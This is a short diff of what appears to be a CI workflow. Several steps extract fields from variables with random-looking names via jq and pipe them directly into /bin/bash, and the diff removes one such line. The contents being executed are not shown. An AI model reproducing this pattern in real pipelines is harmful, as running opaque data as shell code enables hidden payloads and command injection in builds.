@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
           echo $rp37 | jq -r .l3 | /bin/bash
           printf '%s' "$haxl7" | jq -r .ruht30 | /bin/bash
-          printf '%s' "$m1" | jq -r .frl592 | /bin/bash
 
       - name: Save results
         if: always()
